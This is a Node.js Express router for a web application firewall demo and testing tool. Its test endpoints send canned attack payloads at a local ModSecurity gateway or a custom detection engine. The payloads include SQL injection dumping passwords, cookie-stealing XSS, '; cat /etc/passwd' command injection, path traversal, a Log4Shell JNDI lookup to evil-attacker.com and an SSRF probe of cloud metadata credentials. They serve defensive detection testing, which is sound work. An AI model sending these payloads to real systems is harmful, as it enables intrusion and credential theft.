const express = require("express");
const http = require("http");
const wafService = require("../services/wafService");
const crsIngestionService = require("../services/crsIngestionService");
const localDbService = require("../services/localDbService");
const router = express.Router();

// Sensor status endpoint
router.get("/status", (req, res) => {
  const customStatus = wafService.getStatus();
  const crsStatus = crsIngestionService.getStatus();
  res.json({
    customSensor: customStatus,
    officialCrs: crsStatus
  });
});

// ── GENUINE OWASP CRS GATEWAY ENDPOINTS ──

// GET /api/waf/crs/status
router.get("/crs/status", async (req, res) => {
  try {
    await crsIngestionService.checkGatewayHealth();
    const status = crsIngestionService.getStatus();
    const stats = await localDbService.getWafStats();
    res.json({
      success: true,
      crs: status,
      stats
    });
  } catch (err) {
    res.status(500).json({ error: "Failed to get CRS status", details: err.message });
  }
});

// GET /api/waf/crs/events
router.get("/crs/events", async (req, res) => {
  try {
    const limit = parseInt(req.query.limit, 10) || 50;
    const filter = {};
    if (req.query.blocked !== undefined) {
      filter.blocked = req.query.blocked === "true" || req.query.blocked === "1";
    }
    if (req.query.clientIp) {
      filter.clientIp = req.query.clientIp;
    }
    const events = await localDbService.getAllWafEvents(limit, filter);
    res.json({ count: events.length, events });
  } catch (err) {
    res.status(500).json({ error: "Failed to get CRS events", details: err.message });
  }
});

// POST /api/waf/crs/test - Fires a REAL HTTP request through the Docker ModSecurity WAF gateway
router.post("/crs/test", async (req, res) => {
  const { type, payload, ip } = req.body;
  const clientIp = ip || "198.51.100.44";

  let testPath = "/products?search=";
  let testMethod = "GET";
  let headers = {
    "Host": "localhost:8080",
    "User-Agent": "Aapki-Nazar-CRS-Tester/1.0",
    "X-Forwarded-For": clientIp
  };

  if (payload) {
    testPath += encodeURIComponent(payload);
  } else {
    switch (type) {
      case "sqli":
        testPath += encodeURIComponent("' UNION SELECT null, username, password FROM users WHERE '1'='1 --");
        break;
      case "xss":
        testPath += encodeURIComponent("<script>alert('Aapki-Nazar-XSS')</script>");
        break;
      case "cmdi":
        testPath += encodeURIComponent("; cat /etc/passwd | whoami");
        break;
      case "lfi":
        testPath += encodeURIComponent("../../../../etc/passwd");
        break;
      case "scanner":
        headers["User-Agent"] = "sqlmap/1.7#stable";
        testPath = "/products?id=1";
        break;
      case "clean":
      default:
        testPath += encodeURIComponent("enterprise noise-canceling headphones");
        break;
    }
  }

  const options = {
    hostname: "127.0.0.1",
    port: 8080,
    path: testPath,
    method: testMethod,
    headers,
    timeout: 5000
  };

  const startTime = Date.now();
  const request = http.request(options, (wafRes) => {
    let body = "";
    wafRes.on("data", chunk => { body += chunk; });
    wafRes.on("end", async () => {
      const latencyMs = Date.now() - startTime;
      const statusCode = wafRes.statusCode;
      const isBlocked = statusCode === 403;
      const serverHeader = wafRes.headers["server"] || null;
      const backendServer = wafRes.headers["x-backend-server"] || null;
      const protectedBy = wafRes.headers["x-protected-by"] || null;
      const isProtectedApp = !!(backendServer && backendServer.includes("Aapki-Nazar-Protected-App")) || (statusCode === 200 && !!protectedBy);

      // Trigger immediate poll so audit log is parsed without delay
      setTimeout(() => {
        crsIngestionService.pollLog();
      }, 250);

      let action = "ALLOWED";
      let message = "";
      if (isBlocked) {
        action = "BLOCKED";
        message = "Request was blocked by the Official OWASP CRS Engine (HTTP 403 Forbidden).";
      } else if (statusCode === 200) {
        action = "ALLOWED";
        message = isProtectedApp
          ? "Request passed Official OWASP CRS inspection and was fulfilled by the protected demo application (HTTP 200 OK)."
          : "HTTP 200 received from gateway, but protected application identity could not be verified.";
      } else if (statusCode === 502) {
        action = "GATEWAY_ERROR";
        message = "HTTP 502 Bad Gateway: Nginx reverse proxy is running, but the protected demo application container is unreachable.";
      } else if (statusCode === 404) {
        action = "NOT_FOUND";
        message = `HTTP 404 Not Found: Path ${testPath} does not exist on the protected demo application.`;
      } else {
        action = "UNEXPECTED_STATUS";
        message = `Gateway responded with HTTP ${statusCode} (${wafRes.statusMessage || 'Unusual Status'}).`;
      }

      res.json({
        success: true,
        gatewayAvailable: true,
        gatewayUrl: "http://localhost:8080",
        realHttpStatus: statusCode,
        statusDescription: wafRes.statusMessage,
        isBlocked,
        action,
        protectedAppVerified: isProtectedApp,
        latencyMs,
        clientIp,
        targetPath: testPath,
        serverHeader,
        wafHeaders: {
          server: serverHeader,
          date: wafRes.headers["date"]
        },
        message
      });
    });
  });

  request.on("error", (err) => {
    res.status(502).json({
      success: false,
      gatewayAvailable: false,
      error: "Failed to connect to ModSecurity CRS container on port 8080",
      details: err.message,
      isBlocked: false,
      realHttpStatus: null,
      hint: "Verify that Docker Desktop is running and 'docker compose up -d' has been started."
    });
  });

  request.end();
});

// Universal Log Analyzer endpoint (used by Threat Studio)
router.post("/analyze", (req, res) => {
  const { logs, log, text } = req.body;
  const raw = logs || log || text || "";
  const result = wafService.analyzeRawLog(raw);
  res.json(result);
});

// Legacy / Synthetic test endpoint (Clearly labeled as SIMULATED / CUSTOM ENGINE)
router.post("/test", async (req, res) => {
  const { type, ip, payload, log } = req.body;
  const clientIp = ip || req.ip || req.connection?.remoteAddress || "127.0.0.1";
  const customInput = payload || log || null;

  let testPayload = customInput || "";
  let testMethod = "GET";
  let testPath = "/api/waf/products";
  let userAgent = req.headers["user-agent"] || "Aapki-Nazar-Attacker-CLI/1.0";
  let queryObj = {};
  let bodyObj = {};

  if (!customInput) {
    switch (type) {
      case "sqli":
        testPayload = "' UNION SELECT null, username, password FROM users WHERE '1'='1 --";
        testPath = `/api/waf/products?search=${encodeURIComponent(testPayload)}`;
        queryObj = { search: testPayload };
        break;
      case "xss":
        testPayload = "<script>alert('Aapki Nazar XSS Exploited: ' + document.cookie)</script>";
        testPath = `/api/waf/products?search=${encodeURIComponent(testPayload)}`;
        queryObj = { search: testPayload };
        break;
      case "cmdi":
        testPayload = "; cat /etc/passwd | whoami";
        testPath = `/api/waf/lookup?host=google.com${encodeURIComponent(testPayload)}`;
        queryObj = { host: `google.com${testPayload}` };
        break;
      case "log4j":
        testPayload = "${jndi:ldap://evil-attacker.com:1389/Exploit}";
        testPath = "/api/waf/login";
        testMethod = "POST";
        bodyObj = { username: "admin", payload: testPayload };
        userAgent = testPayload;
        break;
      case "ssrf":
        testPayload = "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
        testPath = `/api/waf/fetch-url?url=${encodeURIComponent(testPayload)}`;
        queryObj = { url: testPayload };
        break;
      case "lfi":
        testPayload = "../../../../etc/passwd";
        testPath = `/api/waf/file?name=${encodeURIComponent(testPayload)}`;
        queryObj = { name: testPayload };
        break;
      case "scanner":
        testPayload = "/login.php?id=1";
        testPath = testPayload;
        userAgent = "sqlmap/1.7.2#stable";
        queryObj = { id: "1" };
        break;
      case "bruteforce":
        for (let i = 0; i < 36; i++) {
          wafService.trackVelocity(clientIp);
        }
        testPayload = "admin / password123";
        testPath = "/api/waf/login";
        testMethod = "POST";
        bodyObj = { username: "admin", password: "password123" };
        break;
      case "clean":
      default:
        testPayload = "wireless noise-canceling headphones";
        testPath = `/api/waf/products?search=${encodeURIComponent(testPayload)}`;
        queryObj = { search: testPayload };
        break;
    }
  } else {
    if (type === "scanner" || testPayload.includes("sqlmap") || testPayload.includes("nuclei")) {
      userAgent = testPayload;
      testPath = "/api/waf/scan";
    } else {
      testPath = `/api/waf/probe?q=${encodeURIComponent(testPayload)}`;
      queryObj = { q: testPayload };
      bodyObj = { input: testPayload };
    }
  }

  // Synthetic request object to inspect
  const syntheticReq = {
    method: testMethod,
    originalUrl: testPath,
    url: testPath,
    ip: clientIp,
    query: queryObj,
    body: bodyObj,
    headers: {
      "user-agent": userAgent,
      host: req.headers.host || "localhost:3001"
    },
    io: req.io
  };

  const inspection = wafService.inspectRequest(syntheticReq);

  if (inspection.isThreat) {
    const incident = await wafService.handleWafAlert(inspection, syntheticReq);
    return res.json({
      status: "THREAT_DETECTED",
      threat: true,
      simulation: true,
      engine: "Aapki Nazar Novelty Engine (Custom Signature)",
      blocked: false,
      action: "ALERTED",
      ruleId: inspection.primaryRule?.ruleId,
      category: inspection.primaryRule?.category,
      threatCategory: inspection.primaryRule?.category,
      threatScore: inspection.threatScore,
      severity: inspection.severity,
      mitreTechnique: inspection.primaryRule?.mitre?.id || "T1190",
      incidentId: incident?.incidentId || null,
      attackerIp: clientIp,
      details: inspection
    });
  }

  if (req.io) {
    req.io.emit("telemetry_stream", {
      id: `clean-${Date.now()}`,
      timestamp: new Date().toISOString(),
      raw: `[CUSTOM SENSOR CLEAN] ${testMethod} ${testPath} (200 OK from ${clientIp})`,
      sensor: "CUSTOM-WAF",
      severity: "CLEAN",
      color: "#10b981"
    });
  }

  return res.json({
    status: "CLEAN_TRAFFIC",
    threat: false,
    simulation: true,
    engine: "Aapki Nazar Novelty Engine (Custom Signature)",
    blocked: false,
    action: "ALLOWED",
    message: "Request passed custom inspection with zero anomalies.",
    threatScore: 0,
    clientIp
  });
});

// Protected Demo Routes (Sample Web App behind custom WAF)
router.get("/products", async (req, res) => {
  if (req.io) {
    req.io.emit("telemetry_stream", {
      id: `clean-${Date.now()}`,
      timestamp: new Date().toISOString(),
      raw: `[CLEAN TRAFFIC] GET /api/waf/products (200 OK from ${req.ip || "127.0.0.1"})`,
      sensor: "CUSTOM-WAF",
      severity: "CLEAN",
      color: "#10b981"
    });
  }

  res.json({
    status: "success",
    products: [
      { id: 101, name: "Enterprise SOC Gateway License", price: 499 },
      { id: 102, name: "Autonomous WAF Defense Sensor", price: 299 },
      { id: 103, name: "Zero-Trust Threat Telemetry Agent", price: 199 }
    ]
  });
});

router.post("/login", async (req, res) => {
  res.json({ status: "success", message: "Clean login probe processed." });
});

router.get("/fetch-url", async (req, res) => {
  res.json({ status: "success", message: "Target URL verified safe." });
});

module.exports = router;
